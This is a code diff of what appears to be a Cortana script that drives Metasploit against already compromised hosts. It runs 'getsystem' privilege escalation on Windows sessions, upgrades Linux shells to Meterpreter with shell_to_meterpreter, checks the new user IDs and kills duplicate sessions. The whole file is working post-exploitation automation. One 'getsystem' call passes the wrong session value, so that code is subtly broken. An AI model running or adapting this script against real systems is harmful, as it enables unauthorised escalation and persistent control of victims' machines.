@@ -1,31 +1,88 @@
+debug(7);
+
+on ready {
+   println("ready");
+}
+
 command arguments {
-   @sessions = split(',', $1);
+   local('@sessions');
+   @sessions = split(';', $1);
+   println("arguments");
    fire_event_local("elevatePrivileges", @sessions)
 }
 
 on elevatePrivileges {
-   local('$console $session');
+   println("privileges");
+   local('$console $session @info @sessions');
    $console = console();
 
-   foreach $session (@sessions) {
-      m_cmd($session, "get priv");
-      sleep(1000);
-      m_cmd($session, "getsystem");
-      sleep(3000);
+   foreach $session ($1) {
+      @info = split(',', $session);
+      println(@info);
+      if (@info[1] eq "windows") {
+         m_cmd(@info[0], "get priv");
+         sleep(1000);
+         m_cmd($session, "getsystem");
+         sleep(3000);
+      }
+      else {
+         println("else");
+         cmd($console, "jobs -K");
+         cmd($console, "use post/multi/manage/shell_to_meterpreter");
+         cmd_set($console, %(SESSION => @info[0]));
+         cmd($console, "exploit -j");
+         sleep(20000);
+         println("sleep over");
+      }
    }
-   fire_event_local("checkNewPrivileges", @sessions);
+   #sleep(30000);
+   fire_event_local("checkNewPrivileges", $1);
 }
 
 on checkNewPrivileges {
-   local('$console $session');
+   local('$console $session @info');
    $console = console();
 
-   foreach $session (@sessions) {
-      m_cmd($session, "getuid");
-      sleep(2000);
+   foreach $session ($1) {
+      @info = split(',', $session);
+      if (@info[1] eq "windows") {
+         m_cmd(@info[0], "getuid");
+         sleep(2000);
+      }
    }
+   fire_event_local("getNewSessions", $1);
+}
+
+on getNewSessions {
+   local('$console %out @ids $sessionNum $host $user %r $exploit $type $session @info $close');
+   
+   @ids = session_ids();
+   %out = sessions();
+   $console = console();
+
+   cmd($console, "jobs -K");   
+
+   foreach $sessionNum (@ids) {
+      %r = %out[$sessionNum];
+      $host = %r["host"];
+      $type = %r["type"];
+
+      foreach $session ($1) {
+         @info = split(',', $session);
+         $close = @info[0];
+         if (@info[2] eq $host && @info[1] eq "linux") {
+            if ($sessionNum > @info[0]) {
+               println("$host" . "," . "$sessionNum");
+               cmd($console, "sessions -k $close ");
+            }
+         }
+      }
+   }
+   sleep(3000);
    quit();
+}
 
 on meterpreter_getuid {
    println("$1, $2 -> $3");
+   # ip, user
 }
